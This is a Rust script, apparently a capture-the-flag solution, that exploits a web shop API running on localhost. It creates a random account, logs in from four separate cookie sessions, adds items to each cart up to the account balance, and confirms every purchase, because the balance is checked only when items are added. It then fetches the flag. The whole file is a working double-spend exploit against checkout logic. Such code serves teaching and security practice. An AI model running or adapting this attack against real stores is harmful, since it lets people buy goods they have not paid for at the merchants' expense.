use base64::{engine::general_purpose::STANDARD as B, Engine};
use rand::prelude::*;
use reqwest::Client;
use serde_json::json;

const API: &str = "http://localhost:80/api";

async fn login(client: &Client, user: &str, pass: &str) -> eyre::Result<()> {
    client
        .post(format!("{API}/login"))
        .json(&json!({
            "username": user,
            "password": pass
        }))
        .send()
        .await?;

    Ok(())
}

async fn cart_add(client: &Client, product_id: usize) -> eyre::Result<()> {
    client
        .post(format!("{API}/cart/add"))
        .json(&json!({
            "product_id": product_id,
            "count": 1
        }))
        .send()
        .await?;

    Ok(())
}

async fn confirm(client: &Client) -> eyre::Result<()> {
    client.post(format!("{API}/cart/confirm")).send().await?;

    Ok(())
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> eyre::Result<()> {
    // Create account
    let s: [u8; 12] = thread_rng().gen();
    let user = B.encode(&s);
    let pass = user.clone();

    let r = Client::new()
        .post(format!("{API}/register"))
        .json(&json!({
            "username": user,
            "password": pass
        }))
        .send()
        .await?;

    assert_eq!(r.status(), reqwest::StatusCode::OK);
    eprintln!("{}:{}", user, pass);

    let clients: Vec<_> = (0..4)
        .map(move |_| Client::builder().cookie_store(true).build().unwrap())
        .collect();

    // Login with 4 different sessions
    login(&clients[0], &user, &pass).await?;
    login(&clients[1], &user, &pass).await?;
    login(&clients[2], &user, &pass).await?;
    login(&clients[3], &user, &pass).await?;

    // Add to cart up to available balance for each session
    cart_add(&clients[0], 0).await?;
    cart_add(&clients[0], 2).await?;
    
    cart_add(&clients[1], 1).await?;
    cart_add(&clients[1], 3).await?;

    cart_add(&clients[2], 4).await?;
    
    cart_add(&clients[3], 5).await?;

    // Confirm all purchases (balance is only checked on add to cart)
    confirm(&clients[0]).await?;
    confirm(&clients[1]).await?;
    confirm(&clients[2]).await?;
    confirm(&clients[3]).await?;

    let resp = clients[0]
        .get(format!("{API}/flag"))
        .send()
        .await?
        .text()
        .await?;

    println!("{resp}");

    Ok(())
}
